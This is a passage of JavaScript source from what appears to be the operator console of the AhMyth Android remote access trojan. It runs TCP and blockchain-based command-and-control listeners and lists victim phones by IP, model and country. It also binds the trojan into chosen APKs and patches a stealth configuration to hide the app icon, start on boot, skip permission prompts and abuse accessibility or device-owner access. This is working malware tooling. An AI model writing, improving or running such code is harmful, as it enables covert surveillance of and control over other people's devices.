                if (parts.length >= 2 && parts[1] === 'device') {
                    const deviceId = parts[0];
                    // Try to get device model
                    try {
                        const { stdout: model } = await execAsync(`adb -s ${deviceId} shell getprop ro.product.model`).catch(() => ({ stdout: 'Unknown' }));
                        const { stdout: android } = await execAsync(`adb -s ${deviceId} shell getprop ro.build.version.release`).catch(() => ({ stdout: 'Unknown' }));
                        devices.push({
                            id: deviceId,
                            name: `${model.toString().trim()} (Android ${android.toString().trim()})`
                        });
                    } catch (e) {
                        devices.push({
                            id: deviceId,
                            name: deviceId
                        });
                    }
                }
            }
            
            $appCtrl.availableDevices = devices;
            if (!$appCtrl.$$phase) $appCtrl.$apply();
        } catch (e) {
            console.error('Error refreshing devices:', e);
            $appCtrl.addOutput('Error refreshing devices: ' + e.message, 'error');
        }
    };

    // Add output line (strips ANSI codes for cleaner display) and track chunk status separately
    const stripAnsi = (str) => (str || '').replace(/\u001b\[[0-9;]*m/g, '');
    $appCtrl.chunkLogs = [];
    $appCtrl.addOutput = (content, type = 'info') => {
        const time = new Date().toLocaleTimeString();
        const clean = stripAnsi(content);
        // Detect chunk-related lines and store separately
        if (/chunk/i.test(clean) || /Chunk \d+\/\d+/i.test(clean)) {
            $appCtrl.chunkLogs.push({ time, content: clean, type: 'info' });
            if ($appCtrl.chunkLogs.length > 100) $appCtrl.chunkLogs.shift();
        }
        $appCtrl.outputLines.push({ time, content: clean, type });
        // Keep only last 1000 lines
        if ($appCtrl.outputLines.length > 1000) {
            $appCtrl.outputLines.shift();
        }
        // Auto-scroll to bottom
        setTimeout(() => {
            const outputEl = document.getElementById('testOutput');
            if (outputEl) {
                outputEl.scrollTop = outputEl.scrollHeight;
            }
        }, 100);
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    };

    // Clear output
    $appCtrl.clearOutput = () => {
        $appCtrl.outputLines = [];
        $appCtrl.testResults = [];
        $appCtrl.testStats = { total: 0, passed: 0, failed: 0 };
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    };

    // Start tests
    $appCtrl.startTests = () => {
        if ($appCtrl.isRunning) return;
        
        $appCtrl.isRunning = true;
        $appCtrl.clearOutput();
        $appCtrl.addOutput('Starting comprehensive test suite...', 'info');
        
        // Send IPC message to main process
        ipcRenderer.send('test-suite:start', $appCtrl.testConfig);
    };

    // Stop tests
    $appCtrl.stopTests = () => {
        if (!$appCtrl.isRunning) return;
        
        $appCtrl.addOutput('Stopping tests...', 'warn');
        ipcRenderer.send('test-suite:stop');
    };

    // Listen for test output from main process
    ipcRenderer.on('test-suite:output', (event, data) => {
        $appCtrl.addOutput(data.message, data.type || 'info');
    });

    // Listen for test result
    ipcRenderer.on('test-suite:result', (event, result) => {
        $appCtrl.testResults.push(result);
        if (result.success) {
            $appCtrl.testStats.passed++;
        } else {
            $appCtrl.testStats.failed++;
        }
        $appCtrl.testStats.total = $appCtrl.testResults.length;
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    });

    // Listen for stats updates
    ipcRenderer.on('test-suite:stats', (event, stats) => {
        if (stats && typeof stats.total === 'number') {
            $appCtrl.testStats.total = stats.total;
            $appCtrl.testStats.passed = stats.passed || 0;
            $appCtrl.testStats.failed = stats.failed || 0;
            if (!$appCtrl.$$phase) $appCtrl.$apply();
        }
    });

    // Listen for completion
    ipcRenderer.on('test-suite:complete', (event, stats) => {
        if (stats && typeof stats.total === 'number') {
            $appCtrl.testStats.total = stats.total;
            $appCtrl.testStats.passed = stats.passed || 0;
            $appCtrl.testStats.failed = stats.failed || 0;
            const summaryType = stats.failed > 0 ? 'error' : 'success';
            $appCtrl.addOutput(`Test suite completed. Total: ${stats.total}, Passed: ${stats.passed}, Failed: ${stats.failed}`, summaryType);
        }
        $appCtrl.isRunning = false;
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    });

    // Listen for test statistics update
    ipcRenderer.on('test-suite:stats', (event, stats) => {
        $appCtrl.testStats = stats;
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    });

    // Listen for test completion
    ipcRenderer.on('test-suite:complete', (event, stats) => {
        $appCtrl.isRunning = false;
        if (stats && stats.total > 0) {
            $appCtrl.testStats = stats;
        }
        $appCtrl.addOutput(`\nTest suite completed. Total: ${$appCtrl.testStats.total}, Passed: ${$appCtrl.testStats.passed}, Failed: ${$appCtrl.testStats.failed}`, 
                          $appCtrl.testStats.failed === 0 ? 'success' : 'error');
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    });

    // Listen for test error
    ipcRenderer.on('test-suite:error', (event, error) => {
        $appCtrl.isRunning = false;
        $appCtrl.addOutput('Error: ' + error.message, 'error');
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    });

    // Initialize devices on load
    setTimeout(() => {
        $appCtrl.refreshDevices();
    }, 1000);

    // ========== REQUEST/RESPONSE LOGS CONTROLLER ==========
    $appCtrl.requestLogs = [];
    $appCtrl.autoScrollLogs = true;
    $appCtrl.logFilters = {
        request: true,
        response: true,
        info: true,
        error: true
    };
    
    // Log filter function
    $appCtrl.logFilter = (log) => {
        return $appCtrl.logFilters[log.type] !== false;
    };
    
    // Get log count by type
    $appCtrl.getLogCount = (type) => {
        return $appCtrl.requestLogs.filter(l => l.type === type).length;
    };
    
    // Clear request logs
    $appCtrl.clearRequestLogs = () => {
        $appCtrl.requestLogs = [];
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    };
    
    // Toggle auto-scroll
    $appCtrl.toggleAutoScroll = () => {
        $appCtrl.autoScrollLogs = !$appCtrl.autoScrollLogs;
        if ($appCtrl.autoScrollLogs) {
            $appCtrl.scrollLogsToBottom();
        }
    };
    
    // Apply log filters
    $appCtrl.applyLogFilters = () => {
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    };
    
    // Toggle log data expansion
    $appCtrl.toggleLogData = (index) => {
        if ($appCtrl.requestLogs[index]) {
            $appCtrl.requestLogs[index].expanded = !$appCtrl.requestLogs[index].expanded;
            if (!$appCtrl.$$phase) $appCtrl.$apply();
        }
    };
    
    // Scroll logs to bottom
    $appCtrl.scrollLogsToBottom = () => {
        setTimeout(() => {
            const logsContent = document.getElementById('logsContent');
            if (logsContent) {
                logsContent.scrollTop = logsContent.scrollHeight;
            }
        }, 100);
    };
    
    // Add log entry
    $appCtrl.addRequestLog = (logEntry) => {
        const time = new Date().toLocaleTimeString();
        $appCtrl.requestLogs.push({
            time: time,
            type: logEntry.type || 'info',
            deviceId: logEntry.deviceId || '',
            command: logEntry.command || '',
            data: logEntry.data || '',
            expanded: false
        });
        
        // Keep only last 1000 entries
        if ($appCtrl.requestLogs.length > 1000) {
            $appCtrl.requestLogs.shift();
        }
        
        // Auto-scroll if enabled
        if ($appCtrl.autoScrollLogs) {
            $appCtrl.scrollLogsToBottom();
        }
        
        if (!$appCtrl.$$phase) $appCtrl.$apply();
    };
    
    // Listen for log events from main process
    ipcRenderer.on('log:request', (event, data) => {
        $appCtrl.addRequestLog({
            type: 'request',
            deviceId: data.deviceId,
            command: data.command,
            data: data.data ? JSON.stringify(data.data, null, 2) : ''
        });
    });
    
    ipcRenderer.on('log:response', (event, data) => {
        $appCtrl.addRequestLog({
            type: 'response',
            deviceId: data.deviceId,
            command: data.command,
            data: data.data ? JSON.stringify(data.data, null, 2) : ''
        });
    });
    
    ipcRenderer.on('log:info', (event, data) => {
        $appCtrl.addRequestLog({
            type: 'info',
            deviceId: '',
            command: '',
            data: data.message || ''
        });
    });
    
    ipcRenderer.on('log:error', (event, data) => {
        $appCtrl.addRequestLog({
            type: 'error',
            deviceId: '',
            command: '',
            data: data.message || ''
        });
    });

    // Convert country code to flag image (works on all OS including Windows)
    $appCtrl.getCountryFlag = (countryCode) => {
        const flag = countryCodeToFlag(countryCode);
        if (flag.type === 'icon') {
            // Use Semantic UI icon for special cases
            return $sce.trustAsHtml(`<span class="country-flag" title="${flag.title}"><i class="${flag.value} icon"></i></span>`);
        } else {
            // Use actual flag image from CDN
            return $sce.trustAsHtml(`<img class="country-flag-img" src="${flag.value}" srcset="${flag.value2x} 2x" alt="${flag.title}" title="${flag.title}" style="width:24px;height:18px;vertical-align:middle;border-radius:2px;box-shadow:0 1px 3px rgba(0,0,0,0.3);">`);
        }
    };

    // Wait for DOM to be ready and initialize UI components
    var initUI = () => {
        var log = document.getElementById("log");
        if (!log) {
            console.error("[AhMyth] Log element not found! Retrying...");
            setTimeout(initUI, 100);
            return;
        }
        console.log("[AhMyth] Log element found, UI initialized");

        try {
            if (typeof $ !== 'undefined') {
                $('.menu .item').tab();
                $('.ui.dropdown').dropdown();
            }
        } catch (e) {
            console.error("[AhMyth] Error initializing UI components:", e);
        }
    };
    
    // Try multiple times to ensure DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initUI);
    } else {
        setTimeout(initUI, 50);
    }

    // Handle remote module with fallback
    let electronWindow;
    try {
        electronWindow = remote.getCurrentWindow();
    } catch (e) {
        console.error("[AhMyth] Remote module not available:", e);
        // Fallback: use IPC to communicate with main process
        electronWindow = null;
    }

    $appCtrl.close = () => {
        // Always fire IPC so main handles even if remote fails
        if (ipcRenderer && ipcRenderer.send) {
            ipcRenderer.send('window-close');
        }
        if (electronWindow && !electronWindow.isDestroyed()) {
            electronWindow.close();
        }
    };

    $appCtrl.minimize = () => {
        if (ipcRenderer && ipcRenderer.send) {
            ipcRenderer.send('window-minimize');
        }
        if (electronWindow && !electronWindow.isDestroyed()) {
            electronWindow.minimize();
        }
    };

    $appCtrl.maximize = () => {
        if (ipcRenderer && ipcRenderer.send) {
            ipcRenderer.send('window-maximize');
        }
        if (electronWindow && !electronWindow.isDestroyed()) {
            if (electronWindow.isMaximized()) {
                electronWindow.unmaximize(); // Restore the window size
            } else {
                electronWindow.maximize(); // Maximize the window
            }
        }
    };

    // when user clicks Listen button
    $appCtrl.Listen = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }
        
        // Always start TCP/IP listener
        $appCtrl.Log(`[→] Initiating TCP/IP server on port ${port}...`, CONSTANTS.logStatus.INFO);
        ipcRenderer.send("SocketIO:Listen", port);
        
        // Also start blockchain listener if blockchain C2 is configured
        if ($appCtrl.blockchainC2Enabled || $appCtrl.connectionType === 'blockchain') {
            const channelAddr = $appCtrl.blockchainContract || $appCtrl.blockchainC2Contract;
            const aesKey = $appCtrl.blockchainC2AesKey;
            const rpcUrl = $appCtrl.blockchainRpcUrl;
            const rpcFallbacks = $appCtrl.blockchainRpcFallbacks;
            
            if (channelAddr && aesKey) {
                $appCtrl.Log(`[→] Starting blockchain C2 listener...`, CONSTANTS.logStatus.INFO);
                ipcRenderer.send("Blockchain:Listen", {
                    channelAddress: channelAddr,
                    aesKey: aesKey,
                    rpcUrl: rpcUrl || 'https://api.devnet.solana.com',
                    rpcFallbacks: rpcFallbacks || ''
                });
            } else {
                $appCtrl.Log(`[ℹ] Blockchain C2 not fully configured (need channel address and AES key)`, CONSTANTS.logStatus.INFO);
            }
        }
    };

    $appCtrl.StopListening = (port) => {
        if (!port) {
            port = CONSTANTS.defaultPort;
        }
        $appCtrl.Log(`[→] Stopping server on port ${port}...`, CONSTANTS.logStatus.INFO);
        ipcRenderer.send("SocketIO:Stop", port);
        
        // Also stop blockchain listener
        ipcRenderer.send("Blockchain:Stop");
    };

    ipcRenderer.on("SocketIO:Listen", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.Log(`[ℹ] Server is now accepting connections`, CONSTANTS.logStatus.INFO);
        $appCtrl.isListen = true;
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on("SocketIO:Stop", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.Log(`[ℹ] All connections have been terminated`, CONSTANTS.logStatus.INFO);
        $appCtrl.isListen = false;
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on('SocketIO:NewVictim', (event, index) => {
        try {
            if (victimsList) {
                const victim = victimsList.getVictim(index);
                // getVictim returns -1 if not found - don't add invalid victims
                if (victim && victim !== -1) {
                    markBlockchainCountry(victim);
                    viclist[index] = victim;
                    const status = victim.isOnline ? 'connected' : 'offline (restored)';
                    const connType = victim.ip === 'Blockchain' ? 'blockchain' : 'tcp';
                    $appCtrl.Log(`[✓] Victim ${status}! (${connType})`, CONSTANTS.logStatus.SUCCESS);
                    $appCtrl.Log(`    ├─ IP: ${victim.ip}:${victim.port}`, CONSTANTS.logStatus.INFO);
                    $appCtrl.Log(`    ├─ Device: ${victim.manf || 'Unknown'} ${victim.model || 'Unknown'}`, CONSTANTS.logStatus.INFO);
                    $appCtrl.Log(`    ├─ Android: ${victim.release || 'Unknown'}`, CONSTANTS.logStatus.INFO);
                    $appCtrl.Log(`    └─ Country: ${victim.country ? victim.country.toUpperCase() : 'Unknown'}`, CONSTANTS.logStatus.INFO);
                } else {
                    console.warn(`[AhMyth] Victim not found for index: ${index}`);
                }
            }
        } catch (e) {
            console.error("[AhMyth] Error getting victim:", e);
            $appCtrl.Log(`[✗] Error retrieving victim data: ${e.message}`, CONSTANTS.logStatus.FAIL);
        }
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    // Restore offline victims on startup
    ipcRenderer.on('Victims:RestoreOffline', (event, offlineVictims) => {
        try {
            if (!offlineVictims || !Array.isArray(offlineVictims)) return;
            
            let restoredCount = 0;
            offlineVictims.forEach(({ id, victim }) => {
                try {
                    // Find an available index or use ID-based index
                    let index = parseInt(id.substring(0, 8), 16) % 100000;
                    // Ensure index doesn't conflict
                    while (viclist[index] && viclist[index].id !== id) {
                        index = (index + 1) % 100000;
                    }
                    
                    // Add to viclist
                    markBlockchainCountry(victim);
                    viclist[index] = victim;
                    restoredCount++;
                } catch (e) {
                    console.error(`[AhMyth] Error restoring victim ${id}:`, e);
                }
            });
            
            if (restoredCount > 0) {
                $appCtrl.Log(`[ℹ] Restored ${restoredCount} offline victim(s) from previous session`, CONSTANTS.logStatus.INFO);
            }
        } catch (e) {
            console.error("[AhMyth] Error restoring offline victims:", e);
        }
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on("SocketIO:ListenError", (event, error) => {
        $appCtrl.Log(`[✗] Server Error: ${error}`, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on("SocketIO:StopError", (event, error) => {
        $appCtrl.Log(`[✗] Stop Error: ${error}`, CONSTANTS.logStatus.FAIL);
        $appCtrl.isListen = false;
    });

    // Blockchain listener events
    ipcRenderer.on("Blockchain:Listen", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.blockchainListening = true;
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on("Blockchain:Stop", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.SUCCESS);
        $appCtrl.blockchainListening = false;
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on("Blockchain:ListenError", (event, error) => {
        $appCtrl.Log(`[✗] Blockchain Error: ${error}`, CONSTANTS.logStatus.FAIL);
        $appCtrl.blockchainListening = false;
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on("Blockchain:Log", (event, message) => {
        $appCtrl.Log(message, CONSTANTS.logStatus.INFO);
        // Also append to blockchain logs tab
        $appCtrl.appendBlockchainLog(message);
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
        if (viclist[index]) {
            const victim = viclist[index];
            $appCtrl.Log(`[⚠] Victim disconnected: ${victim.ip} (${victim.manf} ${victim.model})`, CONSTANTS.logStatus.WARNING);
        }
        delete viclist[index];
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    // Handle victim going offline (keep in list)
    ipcRenderer.on('SocketIO:VictimOffline', (event, index) => {
        if (viclist[index]) {
            const victim = viclist[index];
            victim.isOnline = false;
            victim.lastSeen = Date.now();
            $appCtrl.Log(`[⚠] Victim went offline: ${victim.ip} (${victim.manf} ${victim.model})`, CONSTANTS.logStatus.WARNING);
        }
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    // Handle victim data update (from blockchain heartbeat updates)
    ipcRenderer.on('SocketIO:VictimUpdate', (event, index) => {
        if (victimsList) {
            const victim = victimsList.getVictim(index);
            if (victim && victim !== -1) {
                // Update the viclist entry with fresh data
                markBlockchainCountry(victim);
                viclist[index] = victim;
            }
        }
        if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
            $appCtrl.$apply();
        }
    });

    // Handle live battery updates
    ipcRenderer.on('SocketIO:BatteryUpdate', (event, data) => {
        if (viclist[data.id]) {
            viclist[data.id].battery = data.battery;
            if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
                $appCtrl.$apply();
            }
        }
    });

    // Remove victim permanently
    $appCtrl.removeVictim = (index) => {
        if (viclist[index]) {
            const victim = viclist[index];
            $appCtrl.Log(`[✗] Removed victim: ${victim.ip} (${victim.manf} ${victim.model})`, CONSTANTS.logStatus.INFO);
            delete viclist[index];
            if (!$appCtrl.$$phase && !$appCtrl.$root.$$phase) {
                $appCtrl.$apply();
            }
        }
    };

    $appCtrl.openLab = (index) => {
        if (!viclist[index] || !viclist[index].isOnline) {
            $appCtrl.Log(`[✗] Cannot open lab - victim is offline`, CONSTANTS.logStatus.FAIL);
            return;
        }
        $appCtrl.Log(`[→] Opening lab for victim: ${viclist[index].ip}`, CONSTANTS.logStatus.INFO);
        ipcRenderer.send('openLabWindow', 'lab.html', index);
    };
    
    // Function to open folder/file in system file manager
    $appCtrl.openPath = (filePath) => {
        if (!shell) {
            $appCtrl.Log('[✗] Cannot open path: shell module not available', CONSTANTS.logStatus.FAIL);
            return;
        }
        
        try {
            // Check if it's a file or folder
            const fs = require('fs-extra');
            const path = require('path');
            
            // Normalize the path
            let normalizedPath = filePath.trim();
            
            // If it's a file, open the containing folder and select the file
            if (fs.existsSync(normalizedPath)) {
                const stats = fs.statSync(normalizedPath);
                if (stats.isFile()) {
                    // Open folder and select file (Windows/Linux/Mac)
                    shell.showItemInFolder(normalizedPath);
                } else {
                    // It's a directory, just open it
                    shell.openPath(normalizedPath);
                }
                $appCtrl.Log(`[✓] Opened: ${normalizedPath}`, CONSTANTS.logStatus.SUCCESS);
            } else {
                // Path doesn't exist, try to open parent directory
                const parentDir = path.dirname(normalizedPath);
                if (fs.existsSync(parentDir)) {
                    shell.openPath(parentDir);
                    $appCtrl.Log(`[ℹ] Opened parent folder: ${parentDir}`, CONSTANTS.logStatus.INFO);
                } else {
                    $appCtrl.Log(`[✗] Path not found: ${normalizedPath}`, CONSTANTS.logStatus.FAIL);
                }
            }
        } catch (error) {
            $appCtrl.Log(`[✗] Error opening path: ${error.message}`, CONSTANTS.logStatus.FAIL);
        }
    };


    // Enhanced logging with detailed timestamps and levels
    $appCtrl.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        var levelPrefix = '';
        
        if (status == CONSTANTS.logStatus.SUCCESS) {
            fontColor = CONSTANTS.logColors.GREEN;
            levelPrefix = 'SUCCESS';
        } else if (status == CONSTANTS.logStatus.FAIL) {
            fontColor = CONSTANTS.logColors.RED;
            levelPrefix = 'ERROR';
        } else if (status == CONSTANTS.logStatus.INFO) {
            fontColor = CONSTANTS.logColors.YELLOW;
            levelPrefix = 'INFO';
        } else if (status == CONSTANTS.logStatus.WARNING) {
            fontColor = CONSTANTS.logColors.ORANGE;
            levelPrefix = 'WARNING';
        } else {
            levelPrefix = 'LOG';
        }

        const now = new Date();
        const timestamp = now.toLocaleString('en-US', {
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        });

        // Check if message contains a file path and make it clickable
        let clickablePath = null;
        let displayMsg = msg;
        
        // Detect file paths in the message (paths that start with └─ or contain drive letters or /)
        // Match paths like: C:\path\to\file, /path/to/file, or paths after └─
        const pathMatch = msg.match(/(?:└─\s*)?([A-Z]:[\\\/](?:[^\s<>"']+[\\\/])*[^\s<>"']+|(?:[\\\/][^\s<>"']+)+)/);
        if (pathMatch && pathMatch[1]) {
            clickablePath = pathMatch[1].trim();
            // Escape HTML and create clickable link
            const escapedPath = clickablePath.replace(/"/g, '&quot;').replace(/'/g, '&#39;');
            displayMsg = msg.replace(clickablePath, `<a href="#" class="log-path-link" data-path="${escapedPath}" onclick="return false;">${clickablePath}</a>`);
        }
        
        $appCtrl.logs.push({
            date: `[${timestamp}]`,
            msg: msg,
            displayMsg: displayMsg,
            clickablePath: clickablePath,
            isHtml: clickablePath !== null,
            color: fontColor,
            level: levelPrefix
        });
        
        // Ensure log element exists before scrolling
        setTimeout(() => {
            var log = document.getElementById("log");
            if (log) {
                const logContent = log.querySelector('.log-content');
                if (logContent) {
                    // Only auto-scroll if user is at the bottom or within 50px of the bottom
                    const scrollThreshold = 50; // px
                    const isAtBottom = logContent.scrollHeight - logContent.scrollTop <= logContent.clientHeight + scrollThreshold;
                    
                    if (isAtBottom) {
                        logContent.scrollTop = logContent.scrollHeight;
                    }
                } else {
                    // Fallback for older structure, still apply threshold
                    const scrollThreshold = 50; // px
                    const isAtBottom = log.scrollHeight - log.scrollTop <= log.clientHeight + scrollThreshold;
                    if (isAtBottom) {
                        log.scrollTop = log.scrollHeight;
                    }
                }
            }
        }, 0);
        
        if (!$appCtrl.$$phase) {
            $appCtrl.$apply();
        }
    }

    // function to clear the logs each time a button is clicked,
    // this is done to keep things clean.
    $appCtrl.clearLogs = () => {
        if ($appCtrl.logs.length !== 0) {
            $appCtrl.logs = [];
        }
        $appCtrl.Log('[ℹ] Console cleared', CONSTANTS.logStatus.INFO);
        setTimeout(() => {
            const logContent = document.querySelector('.log-content');
            if (logContent) logContent.scrollTop = 0;
        }, 50);
    }

    // Initial welcome messages
    const architecture = process.arch;
    if (architecture === 'ia32') {
        delayedLog('[⚠] WARNING: AhMyth will cease support for 32-bit systems when Apktool reaches v3.0.0', CONSTANTS.logStatus.WARNING);
    } else {
        delayedLog('╔════════════════════════════════════════════════════════════╗', CONSTANTS.logStatus.SUCCESS);
        delayedLog('║       Welcome to AhMyth Android R.A.T v2.0                 ║', CONSTANTS.logStatus.SUCCESS);
        delayedLog('║       Modern Edition with Enhanced Features                ║', CONSTANTS.logStatus.SUCCESS);
        delayedLog('╚════════════════════════════════════════════════════════════╝', CONSTANTS.logStatus.SUCCESS);
        delayedLog('');
        delayedLog('[ℹ] System initialized successfully', CONSTANTS.logStatus.INFO);
        delayedLog('[ℹ] Ready to start server and accept connections', CONSTANTS.logStatus.INFO);
    }

    //function to open the dialog and choose apk to be bound
    $appCtrl.BrowseApk = () => {
        if (!dialog) {
            $appCtrl.Log('[✗] Dialog module not available', CONSTANTS.logStatus.FAIL);
            return;
        }
        dialog.showOpenDialog({
            properties: ['openFile'],
            title: 'Choose APK to bind',
            buttonLabel: 'Select APK',
            filters: [{
                name: 'Android APK', extensions: ['apk']
            } //only select apk files
            ]
        }).then(result => {
            if (result.canceled) {
                $appCtrl.Log('[ℹ] APK selection cancelled', CONSTANTS.logStatus.INFO);
            } else {
                var apkName = result.filePaths[0].replace(/\\/g, "/").split('/').pop();
                $appCtrl.Log(`[✓] APK selected: "${apkName}"`, CONSTANTS.logStatus.SUCCESS);
                readFile(result.filePaths[0]);
            }
        }).catch(() => {
            $appCtrl.Log('[✗] Failed to open file dialog', CONSTANTS.logStatus.FAIL);
        })

        function readFile(filepath) {
            $appCtrl.filePath = filepath;
            $appCtrl.$apply();
        }
    }

    // Function to apply stealth and permission options to StealthConfig.smali
    async function applyStealthConfigToSmali(apkFolder) {
        const stealthConfigPaths = [
            dir.join(apkFolder, 'smali', 'ahmyth', 'mine', 'king', 'ahmyth', 'StealthConfig.smali'),
            dir.join(apkFolder, 'smali_classes2', 'ahmyth', 'mine', 'king', 'ahmyth', 'StealthConfig.smali'),
            dir.join(apkFolder, 'smali_classes3', 'ahmyth', 'mine', 'king', 'ahmyth', 'StealthConfig.smali')
        ];
        
        let stealthConfigPath = null;
        for (const path of stealthConfigPaths) {
            if (fs.existsSync(path)) {
                stealthConfigPath = path;
                break;
            }
        }
        
        if (!stealthConfigPath) {
            delayedLog('[⚠] StealthConfig.smali not found, skipping stealth config modification', CONSTANTS.logStatus.WARNING);
            return;
        }
        
        try {
            delayedLog('[→] Modifying StealthConfig.smali...', CONSTANTS.logStatus.INFO);
            let smaliContent = await fs.promises.readFile(stealthConfigPath, 'utf8');
            
            // Map GUI options to StealthConfig fields
            const stealthMappings = {
                'HIDE_ICON': $appCtrl.stealthOptions?.hideIcon ?? true,
                'HIDE_FROM_RECENTS': $appCtrl.stealthOptions?.hideFromRecents ?? false,
                'START_ON_BOOT': $appCtrl.stealthOptions?.startOnBoot ?? true,
                'SILENT_NOTIFICATION': $appCtrl.stealthOptions?.silentNotification ?? false,
                'PERSISTENT_SERVICE': $appCtrl.stealthOptions?.persistentService ?? true,
                'WAKE_LOCK': $appCtrl.stealthOptions?.wakelock ?? true,
                'AUTO_CLOSE_ACTIVITY': false, // Default to false for better UX
                'UNINSTALL_PROTECTION': false, // Default to false
                'SKIP_PERMISSION_PROMPTS': $appCtrl.silentPermOptions?.skipPrompts ?? false,
                'USE_ACCESSIBILITY_GRANTER': $appCtrl.silentPermOptions?.useAccessibility ?? false,
                'DEVICE_OWNER_MODE': $appCtrl.silentPermOptions?.deviceOwner ?? false,
                'ADB_GRANT_MODE': $appCtrl.silentPermOptions?.generateAdbScript ?? true,
                'SKIP_SPECIAL_PERMISSIONS': false,
                'MINIMAL_PERMISSIONS_ONLY': false,
                'SILENT_PERMISSION_MODE': $appCtrl.silentPermOptions?.skipPrompts ?? false,
                'SKIP_SCREEN_CAPTURE_PROMPT': true,
                'AUTO_REQUEST_SCREEN_CAPTURE': false
            };
            
            let modifiedCount = 0;
            
            // Replace boolean values in smali format
            for (const [fieldName, value] of Object.entries(stealthMappings)) {
                const boolValue = value ? '0x1' : '0x0';
                const boolStr = value ? 'true' : 'false';
                let found = false;
                
                // Pattern 1: Replace in .field declaration with = true/false (direct assignment)
                const fieldPattern = new RegExp(`(\\.field public static final ${fieldName}:Z\\s*=\\s*)(true|false)`, 'g');
                if (fieldPattern.test(smaliContent)) {
                    smaliContent = smaliContent.replace(fieldPattern, `$1${boolStr}`);
                    found = true;
                    modifiedCount++;
                    delayedLog(`[✓] Set ${fieldName} = ${boolStr}`, CONSTANTS.logStatus.SUCCESS);
                    continue;
                }
                
                // Pattern 2: Replace in <clinit> method - find const/4 before sput-boolean
                // Look for: const/4 vX, 0x0 or 0x1 followed by sput-boolean for this field
                const lines = smaliContent.split('\n');
                let inClinit = false;
                let clinitStart = -1;
                let clinitEnd = -1;
                
                // Find <clinit> method boundaries
                for (let i = 0; i < lines.length; i++) {
                    if (lines[i].trim().startsWith('.method static constructor <clinit>()V')) {
                        inClinit = true;
                        clinitStart = i;
                    }
                    if (inClinit && lines[i].trim() === '.end method') {
                        clinitEnd = i;
                        break;
                    }
                }
                
                if (inClinit && clinitStart >= 0 && clinitEnd > clinitStart) {
                    // Search within <clinit> for this field's assignment
                    for (let i = clinitStart; i <= clinitEnd; i++) {
                        // Look for sput-boolean with this field name
                        if (lines[i].includes(`->${fieldName}:Z`)) {
                            // Look backwards for const/4 instruction
                            for (let j = i - 1; j >= clinitStart && j >= i - 5; j--) {
                                const line = lines[j].trim();
                                if (line.startsWith('const/4') && (line.includes('0x0') || line.includes('0x1'))) {
                                    // Replace the const value
                                    lines[j] = lines[j].replace(/0x[01]/g, boolValue);
                                    found = true;
                                    modifiedCount++;
                                    delayedLog(`[✓] Set ${fieldName} = ${boolStr} (in <clinit>)`, CONSTANTS.logStatus.SUCCESS);
                                    break;
                                }
                            }
                            break;
                        }
                    }
                    
                    if (found) {
                        smaliContent = lines.join('\n');
                        continue;
                    }
                }
                
                // Pattern 3: Try to find any const/4 followed by sput-boolean for this field (anywhere in file)
                const sputPattern = new RegExp(`(const/4\\s+v\\d+,\\s*)0x[01]([^\\n]*\\n[^\\n]*sput-boolean[^\\n]*->${fieldName}:Z)`, 'g');
                if (sputPattern.test(smaliContent)) {
                    smaliContent = smaliContent.replace(sputPattern, `$1${boolValue}$2`);
                    found = true;
                    modifiedCount++;
                    delayedLog(`[✓] Set ${fieldName} = ${boolStr} (pattern match)`, CONSTANTS.logStatus.SUCCESS);
                    continue;
                }
                
                if (!found) {
                    delayedLog(`[⚠] Could not find ${fieldName} in StealthConfig.smali`, CONSTANTS.logStatus.WARNING);
                }
            }
            
            // Write the modified content back
            if (modifiedCount > 0) {
                await fs.promises.writeFile(stealthConfigPath, smaliContent, 'utf8');
                delayedLog(`[✓] StealthConfig.smali updated successfully (${modifiedCount} fields modified)`, CONSTANTS.logStatus.SUCCESS);
            } else {
                delayedLog('[⚠] No StealthConfig fields were modified', CONSTANTS.logStatus.WARNING);
            }
            
        } catch (error) {
